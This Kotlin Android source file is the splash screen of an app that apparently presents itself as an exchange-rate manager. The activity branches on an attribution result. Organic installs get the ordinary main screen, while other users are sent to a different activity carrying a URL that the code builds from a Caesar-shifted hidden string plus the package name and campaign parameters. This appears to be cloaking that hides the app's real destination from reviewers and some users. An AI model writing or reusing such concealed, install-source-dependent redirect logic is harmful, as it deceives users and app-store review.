package com.rate.manager.exchange.presentation.activity

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider
import com.onesignal.OneSignal
import com.rate.manager.exchange.R
import com.rate.manager.exchange.data.Da
import com.rate.manager.exchange.data.repository.AdjaRepository
import com.rate.manager.exchange.data.repository.SaveRepository
import com.rate.manager.exchange.domain.models.AdjastModel
import com.rate.manager.exchange.domain.repository.AdjaRepositoryIntefase
import com.rate.manager.exchange.domain.repository.SaveInterface
import com.rate.manager.exchange.domain.userCase.AdjaUserCase
import com.rate.manager.exchange.domain.userCase.SaveUserCase
import com.rate.manager.exchange.presentation.activity.intefase.AdjastResalt
import com.rate.manager.exchange.presentation.viewModel.SplashViewModel

class SplashActivity : AppCompatActivity(), AdjastResalt {

    lateinit var splashViewModel: SplashViewModel
    lateinit var saveRepository: SaveInterface
    lateinit var saveUserCase: SaveUserCase
    lateinit var adjaRepositoryIntefase: AdjaRepositoryIntefase
    lateinit var adjaUserCase: AdjaUserCase
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        splashViewModel = ViewModelProvider(this)[SplashViewModel::class.java]
        OneSignal.initWithContext(this)
        OneSignal.setAppId(Da.kko)
        saveRepository = SaveRepository(this)
        saveUserCase = SaveUserCase(saveRepository)
        adjaRepositoryIntefase = AdjaRepository(this)
        adjaUserCase = AdjaUserCase(adjaRepositoryIntefase)


        if (splashViewModel.getSave(saveUserCase).isEmpty()) {
            Log.d("weq", "111")
            splashViewModel.adj(adjaUserCase, this)
        } else {
            start(true, splashViewModel.getSave(saveUserCase))
        }
    }

    fun start(boolean: Boolean, s: String) {
        if (boolean) {
            val intent = Intent(this, MyManExActivity::class.java)
            intent.putExtra(Da.kk, s)
            startActivity(intent)
            finish()
        } else {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
        }
    }

    override fun resalt(adjastModel: AdjastModel) {
        if (adjastModel.s1 == "n") {

            start(false, "n")
        } else {
            val i = 6
            val ss = Da.l
            val cc = "-$i".toInt()
            var string = ""
            for (element in ss) {
                var c = element
                if (c in 'a'..'z') {
                    c += (cc % 26).toChar().toInt()
                    if (c < 'a') c += 26.toChar().toInt()
                    if (c > 'z') c -= 26.toChar().toInt()
                } else if (c in 'A'..'Z') {
                    c += (cc % 26).toChar().toInt()
                    if (c < 'A') c += 26.toChar().toInt()
                    if (c > 'Z') c -= 26.toChar().toInt()
                }
                string += c
            }

            val sss = string + Da.l1 + Da.kka + Da.l2 + packageName + Da.l3 + adjastModel.s4 +
                    Da.l4 + adjastModel.s1 + Da.l5 + adjastModel.s2 + Da.l6 + adjastModel.s3
            Log.d("weq", sss)
            splashViewModel.setSave(saveUserCase, sss)
            start(true, sss)
        }
    }


}